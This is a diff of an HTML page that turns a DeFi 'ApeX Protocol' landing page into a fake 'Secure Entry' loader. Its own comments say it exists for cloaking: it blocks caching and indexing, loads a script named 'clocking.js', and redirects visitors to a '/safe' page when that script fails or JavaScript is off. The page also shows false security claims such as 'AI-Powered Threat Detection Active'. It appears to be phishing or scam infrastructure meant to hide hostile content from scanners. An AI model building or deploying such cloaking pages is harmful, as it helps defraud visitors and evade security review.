@@ -3,12 +3,18 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ApeX Protocol | AI Yield Optimization</title>
-    <!-- Font Awesome -->
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <!-- Prevent caching and indexing – critical for cloaking -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>ApeX Protocol | Secure Entry</title>
+    <!-- Preconnect to external resources for faster loading -->
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
+    <!-- Font Awesome (optional, matches your style) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <!-- Vanta for background (same as target) -->
-    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -17,268 +23,184 @@
         }
 
         body {
-            font-family: 'Inter', 'Segoe UI', sans-serif;
-            background: #0f172a;
-            color: #e2e8f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #fff;
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
             position: relative;
         }
 
-        #vanta-bg {
-            position: fixed;
+        .bg-particles {
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
+            background: radial-gradient(circle at 20% 30%, rgba(255,107,0,0.05) 0%, transparent 30%),
+                        radial-gradient(circle at 80% 70%, rgba(255,107,0,0.05) 0%, transparent 30%);
+            z-index: 0;
         }
 
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 24px;
-        }
-
-        /* Header */
-        header {
-            padding: 24px 0;
-            border-bottom: 1px solid rgba(255,107,0,0.2);
-            background: rgba(15,23,42,0.7);
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            max-width: 600px;
+            padding: 2rem;
+            background: rgba(15, 23, 42, 0.7);
             backdrop-filter: blur(10px);
-        }
-
-        nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
+            border-radius: 32px;
+            border: 1px solid rgba(255,107,0,0.2);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
 
         .logo {
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 12px;
-        }
-
-        .logo i {
-            font-size: 2rem;
-            color: #ff6b00;
-        }
-
-        .logo span {
-            font-size: 1.8rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #fff, #ff6b00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 32px;
-            list-style: none;
-        }
-
-        .nav-links a {
-            color: #cbd5e1;
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: #ff6b00;
-        }
-
-        /* Hero Section */
-        .hero {
-            padding: 100px 0;
-            text-align: center;
-        }
-
-        .hero h1 {
-            font-size: 3.5rem;
-            font-weight: 700;
-            line-height: 1.2;
             margin-bottom: 24px;
         }
 
-        .hero h1 span {
+        .logo i {
+            font-size: 3rem;
             color: #ff6b00;
+            filter: drop-shadow(0 0 10px rgba(255,107,0,0.5));
         }
 
-        .hero p {
-            font-size: 1.2rem;
+        .logo span {
+            font-size: 2.2rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #fff 0%, #ff6b00 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 64px;
+            height: 64px;
+            border: 5px solid rgba(255,107,0,0.2);
+            border-top: 5px solid #ff6b00;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 32px auto;
+            box-shadow: 0 0 20px rgba(255,107,0,0.3);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: #e2e8f0;
+        }
+
+        p {
+            font-size: 1rem;
             color: #94a3b8;
-            max-width: 700px;
-            margin: 0 auto 40px;
-        }
-
-        /* Feature Cards */
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            margin: 60px 0;
-        }
-
-        .feature-card {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,107,0,0.2);
-            border-radius: 24px;
-            padding: 32px 24px;
-            backdrop-filter: blur(5px);
-            transition: transform 0.3s;
-        }
-
-        .feature-card:hover {
-            transform: translateY(-5px);
-            border-color: #ff6b00;
-        }
-
-        .feature-card i {
-            font-size: 2.5rem;
-            color: #ff6b00;
-            margin-bottom: 20px;
-        }
-
-        .feature-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 12px;
-        }
-
-        .feature-card p {
-            color: #a0aec0;
             line-height: 1.6;
+            margin-bottom: 8px;
         }
 
-        /* Footer */
-        footer {
-            background: rgba(15,23,42,0.9);
-            border-top: 1px solid rgba(255,107,0,0.2);
-            padding: 40px 0;
-            margin-top: 80px;
-        }
-
-        .footer-content {
-            display: flex;
-            justify-content: space-between;
+        .security-badge {
+            display: inline-flex;
             align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        .footer-logo i {
-            font-size: 1.5rem;
-            color: #ff6b00;
-            margin-right: 8px;
-        }
-
-        .footer-links a {
-            color: #94a3b8;
-            text-decoration: none;
-            margin-left: 24px;
-        }
-
-        .footer-links a:hover {
-            color: #ff6b00;
-        }
-
-        .copyright {
-            color: #64748b;
+            gap: 8px;
+            background: rgba(255,107,0,0.1);
+            padding: 8px 20px;
+            border-radius: 40px;
+            border: 1px solid rgba(255,107,0,0.3);
+            margin-top: 24px;
             font-size: 0.9rem;
+            color: #ffd7b3;
         }
 
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 2.5rem; }
-            .nav-links { display: none; } /* simplify for mobile */
+        .security-badge i {
+            color: #ff6b00;
+        }
+
+        footer {
+            margin-top: 32px;
+            font-size: 0.8rem;
+            color: #475569;
+        }
+        /* Fallback message for users without JavaScript */
+        .noscript-warning {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            color: #ffaaaa;
+        }
+        .noscript-warning a {
+            color: #ff6b00;
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div id="vanta-bg"></div>
-
-    <header>
-        <div class="container">
-            <nav>
-                <div class="logo">
-                    <i class="fas fa-ape"></i>
-                    <span>APEX</span>
-                </div>
-                <ul class="nav-links">
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#">Technology</a></li>
-                    <li><a href="#">Team</a></li>
-                    <li><a href="#">Contact</a></li>
-                </ul>
-            </nav>
+    <div class="bg-particles"></div>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-ape"></i>
+            <span>APEX</span>
         </div>
-    </header>
-
-    <main>
-        <section class="hero">
-            <div class="container">
-                <h1>AI-Optimized <span>Yield Infrastructure</span></h1>
-                <p>Institutional‑grade smart contract automation and predictive analytics for the next generation of DeFi.</p>
-            </div>
-        </section>
-
-        <section class="container">
-            <div class="features">
-                <div class="feature-card">
-                    <i class="fas fa-brain"></i>
-                    <h3>AI Optimization</h3>
-                    <p>Proprietary machine learning models continuously optimize yield strategies in real time.</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-shield-alt"></i>
-                    <h3>Secure by Design</h3>
-                    <p>Multiple audit layers, formal verification, and bug bounty programs ensure maximum safety.</p>
-                </div>
-                <div class="feature-card">
-                    <i class="fas fa-chart-line"></i>
-                    <h3>Scalable Liquidity</h3>
-                    <p>Access deep liquidity across chains through our unified aggregation layer.</p>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-logo">
-                    <i class="fas fa-ape"></i> APEX PROTOCOL
-                </div>
-                <div class="footer-links">
-                    <a href="#">Docs</a>
-                    <a href="#">Audits</a>
-                    <a href="#">Careers</a>
-                    <a href="#">Privacy</a>
-                </div>
-                <div class="copyright">
-                    &copy; 2025 ApeX Protocol. All rights reserved.
-                </div>
-            </div>
+        <div class="loader"></div>
+        <h2>Establishing Secure Connection</h2>
+        <p>Validating environment • Applying security policies • Routing to optimal gateway</p>
+        <p style="font-size: 0.9rem; color: #64748b;">This may take a few seconds...</p>
+        
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i> AI-Powered Threat Detection Active
         </div>
-    </footer>
 
+        <footer>
+            <i class="fas fa-lock"></i> End-to-end encrypted • v3.0.1
+        </footer>
+    </div>
+
+    <!-- Safety timeout: if cloaking script fails, redirect to safe page after 5 seconds -->
     <script>
-        // Initialize Vanta background (same as target page, but harmless)
-        VANTA.NET({
-            el: "#vanta-bg",
-            mouseControls: true,
-            touchControls: true,
-            gyroControls: false,
-            minHeight: 200.0,
-            minWidth: 200.0,
-            scale: 1.0,
-            scaleMobile: 1.0,
-            color: 0xff6b00,
-            backgroundColor: 0x0f172a,
-            points: 15.0,
-            maxDistance: 25.0,
-            spacing: 18.0,
-        });
+        (function() {
+            // Set a timeout to redirect to the safe page using the absolute path /safe
+            const safetyTimeout = setTimeout(function() {
+                window.location.replace('/safe');
+            }, 5000); // 5 seconds
+
+            // The cloaking script will call this function to cancel the timeout if it succeeds
+            window.cloakingReady = function() {
+                clearTimeout(safetyTimeout);
+            };
+        })();
     </script>
+
+    <!-- Load your cloaking script – this is the only JS that matters -->
+    <script type="module" src="../Java/clocking.js"></script>
+
+    <!-- Fallback for users with JavaScript disabled -->
+    <noscript>
+        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; z-index: 9999;">
+            <div class="container" style="margin: 20px;">
+                <div class="noscript-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    JavaScript is required to proceed. Please enable JavaScript or 
+                    <a href="/safe">click here</a> to continue.
+                </div>
+            </div>
+        </div>
+        <meta http-equiv="refresh" content="0; url=/safe">
+    </noscript>
 </body>
 </html>
